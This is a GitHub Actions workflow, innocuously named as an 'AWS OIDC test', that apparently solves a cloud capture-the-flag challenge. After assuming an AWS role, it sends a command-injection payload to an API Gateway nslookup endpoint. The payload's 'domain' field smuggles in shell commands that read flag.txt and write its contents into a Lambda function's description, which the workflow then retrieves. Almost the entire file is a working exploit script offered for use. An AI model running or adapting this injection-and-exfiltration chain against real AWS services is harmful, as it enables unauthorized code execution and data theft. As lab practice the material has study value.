name: AWS OIDC test for school standart old code procedure

on:
  push:
    branches:
      - corgi

permissions:
  id-token: write
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Invoke Vulnerable Lambda & Exfiltrate via Function Metadata
        run: |
          API_ID="3q931syi7b"
          REGION="us-east-1"
          URL="https://${API_ID}.execute-api.${REGION}.amazonaws.com/dev/nslookup"
          
          echo "=== 1. TRIGGERING COMMAND INJECTION TO UPDATE LAMBDA METADATA ==="
          # Inject command to read flag.txt and update the Lambda function's description
          PAYLOAD='{"domain": "127.0.0.1; FLAG=$(cat flag.txt); aws lambda update-function-configuration --function-name nslookupv2 --description \"FLAG: $FLAG\" --region us-east-1"}'
          
          curl -s -X POST "$URL" \
            -H "Content-Type: application/json" \
            -d "$PAYLOAD"
          
          echo ""
          echo "=== 2. WAITING 3 SECONDS FOR CONFIGURATION UPDATE ==="
          sleep 3
          
          echo "=== 3. FETCHING FLAG VIA CICDROLE (LAMBDA GET-FUNCTION) ==="
          # Since cicdRole has permission to describe the Lambda function, grab the description!
          aws lambda get-function --function-name nslookupv2 --region us-east-1 --query 'Configuration.Description' --output text > ./the_flag.txt
          
          echo ""
          echo "=== 4. BEHOLD YOUR HARD-EARNED VICTORY ==="
          cat ./the_flag.txt
